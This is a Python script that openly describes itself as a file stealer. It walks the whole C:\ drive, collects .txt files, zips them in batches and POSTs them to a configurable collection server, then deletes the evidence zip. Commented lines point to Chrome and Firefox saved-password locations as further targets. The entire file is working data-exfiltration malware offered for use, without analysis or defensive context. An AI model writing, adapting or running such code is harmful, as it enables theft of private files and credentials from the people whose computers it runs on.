import os # dealing with files
from zipfile import ZipFile
import requests # to send files
import threading # to run file sending mechanism in the background
import mimetypes # to get MIME types for files
from contextlib import ExitStack # to close files properly
from secrets import token_hex

URL = 'http://127.0.0.1:8000' # the URL/IP to which you want to send the stolen files/information to
ZIP_URL = 'http://127.0.0.1:8000/zip'
INTERVAL = 3.0 # Interval between sending files (in seconds). Don't make this too low because you're going to DDOS yourself.
USERNAME = os.getlogin()
#GOOGLE_PASSWORDS = f'C:\\Users\\{USERNAME}\AppData\Local\Google\Chrome\\User Data\Default' # location of Google passwords
#FIREFOX_PASSWORDS = f'C:\\Users\\{USERNAME}\AppData\Roaming\Mozilla\Firefox\Profiles\logins.json' # location of Firefox passwords

#file_types = ['.txt'] # if checking for multiple file types
files_found = [] # log files found.
# NOTE: Files of interest are already in list so they can be sent right at the start.

def file_search():
    for dir, sdirs, files in os.walk('C:\\'): # dir - directories, sdirs - subdirectories
        #print(f'directory: {dir}\n \ # for testing to show all files scanned
        #      subdirectories: {sdirs}\n \
        #      files: {files}')
        for file in files:
            #if any(type in file for type in file_types): # check for multiple file types of interest. if you want to use this, comment out the next line.
            if '.txt' in file: # check file type
                #print(dir + '\\' + file) # for debugging
                files_found.append([dir + '\\' + file]) # log the found file's address
            if len(files_found) > 100:
                threading.Thread(target=steal_zipped_files()) # run the file stealing mechanism in the background

def steal_zipped_files():
    count = len(files_found) # Assume new files were added which you haven't sent yet and log how many you're sending so you know how many to remove later
    zip_name = make_zip() # make the zip with all its files and save its name
    with open(zip_name, 'rb') as zip:
        zip_file = {'file':(zip_name, zip, 'application/zip')}
        r = requests.post(ZIP_URL, files=zip_file)
        if not 300 > r.status_code >= 200:
            pass
        else:
            zip.close()
            os.remove(zip_name)
            del files_found[:count]

def steal_files(): # steal files (Non-zipped version, zipped version is default)
    count = len(files_found) # Assume new files were added which you haven't sent yet and log how many you're sending so you know how many to remove later
    files = {} # progressively add more files to the payload
    with ExitStack() as stack:
        for file in files_found[:count]:
            file = file[0]
            file_name = os.path.basename(file) # get the file name from the path
            f = stack.enter_context(open(file, 'rb')) # open the file in read-only mode binary
            type = mimetypes.guess_type(file) # get the MIME type
            files["files"] = (file_name, f, type) # make the payload for the file containing the file name, the file in binary, and its MIME type and add it to the list of the payload
        r = requests.post(URL, files=files) # POST (send) the file
    if not 300 > r.status_code >= 200:
        pass
    else:
        del files_found[:count]

def make_zip():
    zip_name = f'{token_hex(64)}.zip' # give every zip a random name so you don't get errors due to a zip file being open when you're trying to delete it
    print(f'Zipping {zip_name}')
    with ZipFile(zip_name, 'w') as zip:
        for file in files_found:
            zip.write(file[0], arcname=os.path.basename(file[0]))
    return zip_name

file_search()